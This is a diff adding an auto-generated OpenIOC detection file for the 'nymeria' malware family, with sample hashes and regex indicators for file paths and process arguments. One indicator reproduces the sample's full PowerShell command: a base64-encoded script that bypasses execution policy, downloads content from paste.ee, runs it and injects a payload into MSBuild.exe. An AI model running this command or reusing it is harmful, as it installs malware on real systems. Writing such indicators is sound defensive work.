@@ -1,0 +1,51 @@
+<?xml version="1.0" ?><OpenIOC id="498d68d7-70a1-4e03-aded-9528f93aa07f" last-modified="2020-05-25T12:05:57" published-date="2020-05-25T00:00:00" xmlns="http://openioc.org/schemas/OpenIOC_1.1" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+  <metadata>
+    <short_description>EIGER_nymeria</short_description>
+    <description>
+        Family:
+            nymeria
+        SHA-256:
+            a671d60d5caa40f92e4cdb14728d585041bdd26b08d65ed80b3f772ae2ccce3b
+            df5a7d2b335e775839f4f91c0653048c11ceebeb3fcf51c7861a895f9a702d8e
+            d2fc2cc7902b10b6c276cde09dd02e144d7025dd22905205b2601c5305e957c1
+            cf15cf517a158423ba96583e87cf1b60716ae37c4cce624e2aedd25b436a7b10
+            dc7e532a83cb25dd56af7c9f62f6e796f14cee2610c92d954f5709dac3586c50
+        Reference:
+            https://www.microsoft.com/en-us/wdsi/threats/threat-search?query=nymeria
+            https://www.google.com/search?q=nymeria
+    </description>
+    <keywords/>
+    <authored_by>EIGER - Exhaustive IOC Generator</authored_by>
+    <authored_date>2020-05-25T12:05:57</authored_date>
+    <links/>
+  </metadata>
+  <criteria>
+    <Indicator id="e6dd4a15-09cb-4565-80a3-ea4d318d60ed" operator="OR">
+      <IndicatorItem condition="matches" id="9f16fde8-79bd-423c-b93d-3dfa51ff4171" negate="false" preserve-case="false">
+        <Context document="FileItem" search="FileItem/FullPath" type="mir"/>
+        <Content type="string">C\:\\work\\IRTT\\[A-Z0-9]{4}.log\\IRTT\.log</Content>
+      </IndicatorItem>
+      <IndicatorItem condition="matches" id="c565aec1-182f-41c0-adfe-70f17c1ba60e" negate="false" preserve-case="false">
+        <Context document="FileItem" search="FileItem/FullPath" type="mir"/>
+        <Content type="string">C\:\\work\\(?:7za\.exe|pslog(?:list\.exe|gedon\.exe)|winpmem_1\.6\.2\-signed\.exe|autorunsc\.exe|reg\.exe|md5deep_signed\.exe)</Content>
+      </IndicatorItem>
+      <IndicatorItem condition="matches" id="fe59ca80-428d-4f07-9f8e-f41d87f83131" negate="false" preserve-case="false">
+        <Context document="ProcessItem" search="ProcessItem/arguments" type="mir"/>
+        <Content type="string">powershell\.exe\ PowERsHELl\.\`ExE\ \-ExecutionPolicy\ bypass\ \-w\ 1\ \/e\ JAByAGUAZwAgAD0AIAAoACcAewAyAH0AewAwAH0AewAxAH0AewAzAH0AJwAtAGYAJwBkAFMAdAAnACwAJwByAGkAbgAnACwAHCBgAEQAYABvAGAAdwBuAGAAbABgAG8AYQAdICwAJwBnACcAKQA7AFsAdgBvAGkAZABdACAAWwBTAHkAcwB0AGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZABXAGkAdABoAFAAYQByAHQAaQBhAGwATgBhAG0AZQAoACcATQBpAGMAcgBvAHMAbwBmAHQALgBWAGkAcwB1AGEAbABCAGEAcwBpAGMAJwApADsAJABmAGoAPQBbAE0AaQBjAHIAbwBzAG8AZgB0AC4AVgBpAHMAdQBhAGwAQgBhAHMAaQBjAC4ASQBuAHQAZQByAGEAYwB0AGkAbwBuAF0AOgA6AEMAYQBsAGwAQgB5AG4AYQBtAGUAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAcIGAATgBgAGUAYABUAGAALgBgAFcAYABlAGAAQgBgAEMAYABsAGAAaQBgAGUAYABOAGAAVAAdICkALAAkAHIAZQBnACwAWwBNAGkAYwByAG8AcwBvAGYAdAAuAFYAaQBzAHUAYQBsAEIAYQBzAGkAYwAuAEMAYQBsAGwAVAB5AHAAZQBdADoAOgBNAGUAdABoAG8AZAAsACcAaAB0AHQAJwArAFsAQwBoAGEAcgBdADgAMAArACcAJwAgACsAIABbAEMAaABhAHIAXQA1ADgAIAArACAAJwAvAC8AcABhAHMAdABlAC4AZQBlAC8AcgAvAGEATQBjAGsAYgAnACkALgBSAGUAcABsAGEAYwBlACgAIgBeACIALAAgACIANAA0ACIAKQAuAFIAZQBwAGwAYQBjAGUAKAAiACoAIgAsACAAIgA0ADgAIgApAC4AUgBlAHAAbABhAGMAZQAoACIAIwAiACwAIAAiADcAOAAiACkAfABJAEUAWAA7AFsAQgB5AHQAZQBbAF0AXQAkAGYAPQBbAE0AaQBjAHIAbwBzAG8AZgB0AC4AVgBpAHMAdQBhAGwAQgBhAHMAaQBjAC4ASQBuAHQAZQByAGEAYwB0AGkAbwBuAF0AOgA6AEMAYQBsAGwAQgB5AG4AYQBtAGUAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAcIGAATgBgAGUAYABUAGAALgBgAFcAYABlAGAAQgBgAEMAYABsAGAAaQBgAGUAYABOAGAAVAAdICkALAAkAHIAZQBnACwAWwBNAGkAYwByAG8AcwBvAGYAdAAuAFYAaQBzAHUAYQBsAEIAYQBzAGkAYwAuAEMAYQBsAGwAVAB5AHAAZQBdADoAOgBNAGUAdABoAG8AZAAsACcAaAB0AHQAJwArAFsAQwBoAGEAcgBdADgAMAArACcAcwAnACAAKwAgAFsAQwBoAGEAcgBdADUAOAAgACsAIAAnAC8ALwBwAGEAcwB0AGUALgBlAGUALwByAC8AQQBEAEIANQByACcAKQAuAHIAZQBwAGwAYQBjAGUAKAAnACQAJAAnACwAJwAwAHgAJwApAHwASQBFAFgAOwBbAGsALgBIAGEAYwBrAGkAdAB1AHAAXQA6ADoAZQB4AGUAKAAnAE0AUwBCAHUAaQBsAGQALgBlAHgAZQAnACwAJABmACkA</Content>
+      </IndicatorItem>
+      <IndicatorItem condition="matches" id="d332e4e4-49f0-4158-8e02-2e8c25b41fa2" negate="false" preserve-case="false">
+        <Context document="FileItem" search="FileItem/FullPath" type="mir"/>
+        <Content type="string">C\:\\Users\\.*\\AppData\\Local\\Temp\\PassGeeker\\(?:m_Pic16\.png|Select2_1\.png|icon\.png|tip_Close_1\.png)</Content>
+      </IndicatorItem>
+      <IndicatorItem condition="matches" id="524ee27d-6871-489d-8631-ebc77147178e" negate="false" preserve-case="false">
+        <Context document="FileItem" search="FileItem/FullPath" type="mir"/>
+        <Content type="string">C\:\\Users\\.*\\Desktop\\\å\¥\½\.123\.exe</Content>
+      </IndicatorItem>
+      <IndicatorItem condition="matches" id="e953bf3e-62bc-4c6a-8603-a8ff37a87ec1" negate="false" preserve-case="false">
+        <Context document="FileItem" search="FileItem/FullPath" type="mir"/>
+        <Content type="string">C\:\\Users\\.*\\AppData\\Local\\Temp\\[A-Z0-9]{11}\\[A-Z0-9]{11}</Content>
+      </IndicatorItem>
+    </Indicator>
+  </criteria>
+  <parameters/>
+</OpenIOC>
